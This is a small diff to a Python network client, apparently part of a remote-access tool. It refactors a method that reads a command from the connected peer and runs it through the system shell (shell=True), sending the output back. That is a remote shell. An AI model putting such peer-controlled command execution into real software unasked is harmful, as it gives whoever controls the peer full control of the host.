@@ -1,7 +1,6 @@
 import sys
 import logging
 
-# Modules
 import subprocess
 from io import StringIO
 
@@ -50,8 +49,11 @@ class Client(BaseClient):
         """ Open a shell for peer """
         command = self.read().decode()
         logging.info('Executing shell command: %s' % command)
-        execute = lambda command: subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        process = execute(command)
+        process = subprocess.Popen(
+            command,
+            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            shell=True
+        )
         self.write(process.stdout.read() + process.stderr.read())
 
     def interpreter(self) -> None:
